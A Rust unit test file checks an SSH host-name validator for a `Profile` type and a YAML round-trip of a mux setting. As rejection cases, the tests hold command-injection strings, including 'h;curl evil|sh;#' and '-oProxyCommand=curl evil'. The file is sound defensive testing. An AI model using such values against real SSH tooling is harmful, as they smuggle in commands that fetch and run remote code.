//! `Profile` unit tests (kept beside the type; the 800-line gate moved them here).

use super::*;

#[test]
fn safe_hosts_are_accepted() {
    for host in [
        "example.com",
        "prod.internal",
        "10.0.0.4",
        "fe80::1",
        "host-1_a.local",
    ] {
        assert!(is_safe_ssh_host(host), "expected {host:?} to be accepted");
    }
}

#[test]
fn shell_metacharacters_are_rejected() {
    for host in [
        "h;curl evil|sh;#",
        "host;id",
        "host|id",
        "host&id",
        "host$(id)",
        "host`id`",
        "host$IFS",
        "host<in",
        "host>out",
    ] {
        assert!(!is_safe_ssh_host(host), "expected {host:?} to be rejected");
    }
}

#[test]
fn control_characters_and_leading_dash_are_rejected() {
    assert!(!is_safe_ssh_host("host\nid"));
    assert!(!is_safe_ssh_host("host\rid"));
    assert!(!is_safe_ssh_host("host\0id"));
    assert!(!is_safe_ssh_host("host\tid"));
    assert!(!is_safe_ssh_host("-oProxyCommand=curl evil"));
}

#[test]
fn unsafe_ssh_host_blocks_argv_and_is_reported_by_validate() {
    let mut profile = Profile::new("evil");
    profile.ssh_host = Some("h;curl evil|sh;#".to_string());

    assert!(profile.ssh_command_args().is_none());
    assert!(
        profile
            .validate()
            .iter()
            .any(|w| w.contains("is unsafe (SEC-007)"))
    );
}

/// The per-profile opt-out of `use_mux_by_default`: absent inherits
/// (None), an explicit value round-trips.
#[test]
fn use_mux_by_default_absent_inherits_and_explicit_round_trips() {
    let absent = serde_yaml_ng::from_str::<Profile>(concat!(
        "id: 0194d8d2-5d31-7abc-8f2e-3f4a5b6c7d8e\n",
        "name: local\n"
    ))
    .expect("absent");
    assert_eq!(
        absent.use_mux_by_default, None,
        "an old config without the key must parse as inherit"
    );
    let mut profile = Profile::new("local");
    profile.use_mux_by_default = Some(false);
    let text = serde_yaml_ng::to_string(&profile).expect("serialize");
    let parsed = serde_yaml_ng::from_str::<Profile>(&text).expect("round trip");
    assert_eq!(parsed.use_mux_by_default, Some(false));
}
